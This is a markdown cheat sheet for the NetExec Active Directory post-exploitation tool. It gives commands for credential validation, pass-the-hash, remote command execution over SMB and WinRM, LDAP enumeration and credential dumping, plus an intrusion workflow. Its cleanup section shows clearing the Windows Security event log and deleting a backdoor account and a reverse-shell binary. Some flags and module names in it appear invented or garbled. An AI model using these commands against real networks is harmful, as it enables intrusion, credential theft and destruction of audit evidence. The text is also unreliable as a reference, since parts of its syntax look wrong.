# NetExec (Fork of CrackMapExec) 

NetExec is an advanced, modular post-exploitation toolset for automating Active Directory enumeration, credential validation, lateral movement, file transfers, and command execution.

---
## Installing NetExec

```bash
git clone https://github.com/Pennyw0rth/NetExec
cd NetExec
pip3 install -r requirements.txt
python3 setup.py install
```

> Optional: Set up a Python virtualenv to isolate dependencies.

---
## Core Syntax

```bash
nxc <protocol> <target(s)> [flags]
```

### Protocols:

- `smb` – Server Message Block (Windows file shares)
- `winrm` – Remote Windows PowerShell
- `ldap` – AD user/group enumeration
- `kerberos` – For TGT/TGS ticket hunting (w/ `--kerberos`)
- `mssql`, `rdp`, `ssh`, `ftp`, `http`, `imap` – Available via modules

---
## Authentication Methods

|Method|Syntax Example|
|---|---|
|Plaintext|`-u user -p pass`|
|Hashes (PTH)|`-u user -H aad3...:hash`|
|Kerberos|`-k -d domain.local` (Requires `KRB5CCNAME` or ticket)|
|AAD/SSPI (not yet supported)|Work in progress (use other tools)|

---
## SMB Examples

### Validate Credentials

```bash
nxc smb 10.10.10.10 -u alice -p Winter2020!
```

### Enumerate Shares

```bash
nxc smb 10.10.10.10 -u alice -p Winter2020! --shares
```

**Expected Output:**

```text
[+] 10.10.10.10:445 - Found 3 accessible shares:
    - ADMIN$
    - C$
    - Public
```

### Download File

```bash
nxc smb 10.10.10.10 -u user -p pass --exec "get \\10.10.10.10\C$\Users\Public\loot.txt loot.txt"
```

### Upload File

```bash
nxc smb 10.10.10.10 -u user -p pass --exec "put local.exe \\10.10.10.10\C$\Temp\local.exe"
```

---
## Remote Code Execution

### Over SMB

```bash
nxc smb 10.10.10.10 -u admin -p 'Passw0rd!' -d DOMAIN --exec 'cmd.exe /c whoami'
```

> Requires `admin` access (impersonates via `svcctl`, `wmi`, etc. internally)

### Over WinRM (PowerShell)

```bash
nxc winrm 10.10.10.10 -u admin -p 'Passw0rd!' -d domain --exec 'whoami'
```

---
## Pass-the-Hash (PTH)

```bash
nxc smb 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:ccb749a1e26e51b6e07ed92d6d68f762 -d domain --exec 'hostname'
```

_Why it works:_ Uses NTLMv1/v2 authentication to bypass password requirement.

---
## Kerberos Authentication (TGT-based)

1. Request TGT with `impacket-getTGT`
    

```bash
impacket-getTGT domain/user:password
```

2. Export ccache:
    

```bash
export KRB5CCNAME=/path/to/krb5cc_domain
```

3. Run NetExec with `--kerberos`
    

```bash
nxc smb 10.10.10.10 -k -d domain.local --exec 'whoami'
```

> Use this for **OPSEC-safe access** when you already have a valid ticket.

---
## AD Enumeration via LDAP

```bash
nxc ldap 10.10.10.10 -u user -p pass -d domain.local --users
```

```bash
nxc ldap 10.10.10.10 -u user -p pass -d domain.local --groups
```

Other LDAP options:

- `--computers`
    
- `--password-policy`
    
- `--domain-controllers`
    
- `--loggedon-users`
    

---
## Modules You Should Know

```bash
nxc smb <target> -u user -p pass -d domain --modules
```

Common useful modules:

- `lsassy`: Extracts LSASS credentials via SeDebugPrivilege
    
- `wmi`: Executes WMI queries
    
- `psremote`: Executes PowerShell scripts remotely
    
- `samdump`: Dumps local SAM hashes
    
- `dpapi`: Attempts DPAPI blob extraction
    
- `credz`: Parses saved credentials
    

---
## Cleanup (Post-Exploitation Hygiene)

Remove artifacts like payloads or logs:

```bash
nxc smb 10.0.0.12 -u user -p pass --exec "del C:\Temp\rev.exe"
```

Clear Windows Event Logs if needed (⚠️ noisy, only do if absolutely necessary):

```bash
nxc winrm 10.0.0.12 -u user -p pass -d domain --exec 'wevtutil cl Security'
```

Logoff/Disable the backdoor account if you created one:

```bash
nxc smb 10.0.0.12 -u admin -p pass --exec 'net user backdoor /delete'
```

---
## NetExec Cheatsheet

| Task                         | Command Example                                         |
| ---------------------------- | ------------------------------------------------------- |
| Check credentials (SMB)      | `nxc smb $IP -u user -p pass`                           |
| Enumerate shares             | `nxc smb $IP -u user -p pass --shares`                  |
| List domain users/groups     | `nxc ldap $IP -u user -p pass --users / --groups`       |
| PTH authentication           | `nxc smb $IP -u user -H LM:NT`                          |
| Kerberos authentication      | `nxc smb -k -d domain.local`                            |
| Execute command (SMB)        | `nxc smb $IP -u admin -p pass --exec 'whoami'`          |
| WinRM command execution      | `nxc winrm $IP -u admin -p pass --exec 'hostname'`      |
| Upload file                  | `nxc smb $IP --exec 'put local.exe \\C$\Temp\back.exe'` |
| Download file                | `nxc smb $IP --exec 'get \\C$\Temp\loot.txt local.txt'` |
| Pivot with ProxyChains       | `proxychains nxc smb $IP ...`                           |
| Enumerate AD password policy | `nxc ldap $IP -u user -p pass --password-policy`        |
|                              |                                                         |

---
## Recommended Operator Workflow

```text
[0] Known creds? Try them!
 ↓
[1] Validate credentials (SMB or WinRM)
 ↓
[2] Enumerate shares → find loot
 ↓
[3] Enumerate users, groups, computers via LDAP
 ↓
[4] Identify Admin rights → execute payload or commands
 ↓
[5] Pivot internally via ProxyChains or socks
 ↓
[6] Dump creds (lsassy, samdump, dpapi)
 ↓
[7] Cleanup (remove binaries/logs)
```

> _Pro Tip:_ After first access, start a BloodHound collection or dump tokens for delegation/impersonation.